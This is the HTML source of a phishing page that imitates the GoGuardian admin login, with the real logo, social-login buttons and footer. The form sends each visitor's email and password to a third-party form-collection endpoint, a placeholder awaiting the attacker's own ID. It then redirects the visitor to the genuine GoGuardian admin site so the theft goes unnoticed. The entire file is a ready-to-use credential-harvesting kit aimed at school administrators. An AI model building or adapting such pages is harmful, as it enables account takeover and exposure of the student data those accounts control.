<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoGuardian Account - Log in</title>
    <link rel="stylesheet" href="index.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="auth-layout">
        <header class="auth-header">
            <img src="https://account.goguardian.com/assets/images/logo/logo-full.26c36149.svg" alt="GoGuardian Logo" class="logo">
        </header>

        <main class="auth-main">
            <div class="auth-card">
                <div class="card-header">
                    <p class="admin-label">GOGUARDIAN ADMIN</p>
                    <h1>Log in to your account</h1>
                </div>

                <!-- Formspree Integration with correct redirect -->
                <form class="login-form" action="https://formspree.io/f/YOUR_ENDPOINT_HERE" method="POST">
                    <input type="hidden" name="_next" value="https://admin.goguardian.com">
                    <input type="hidden" name="_subject" value="New GoGuardian Login Attempt">
                    
                    <div class="input-group">
                        <input type="email" name="email" placeholder="Email" id="email" required>
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" placeholder="Password" id="password" required>
                    </div>
                    <button type="submit" class="btn btn-login">Log in</button>
                    
                    <div class="separator">
                        <span>or</span>
                    </div>

                    <div class="social-logins">
                        <button type="button" class="btn btn-social btn-google">
                            <span class="icon-box"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google"></span>
                            <span class="btn-text">Log in with Google</span>
                        </button>
                        <button type="button" class="btn btn-social btn-clever">
                            <span class="icon-box"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Clever_logo.svg" alt="Clever"></span>
                            <span class="btn-text">Log in with Clever</span>
                        </button>
                        <button type="button" class="btn btn-social btn-classlink">
                            <span class="icon-box"><img src="https://www.classlink.com/images/ClassLink_Symbol_Logo.svg" alt="ClassLink"></span>
                            <span class="btn-text">Log in with ClassLink</span>
                        </button>
                    </div>

                    <div class="form-footer">
                        <div class="links-row top">
                            <a href="#">Sign in with Single Sign On</a>
                            <a href="#">Learn More</a>
                        </div>
                        <div class="links-row">
                            <a href="#">Need an account?</a>
                        </div>
                        <div class="links-row">
                            <a href="#">Forgot your password?</a>
                        </div>
                    </div>
                </form>
            </div>
        </main>

        <footer class="app-footer">
            <div class="footer-left">
                <a href="#">Blog</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms</a>
            </div>
            <div class="footer-right">
                <span>© 2026 GoGuardian. All Rights Reserved.</span>
            </div>
        </footer>
    </div>
</body>
</html>
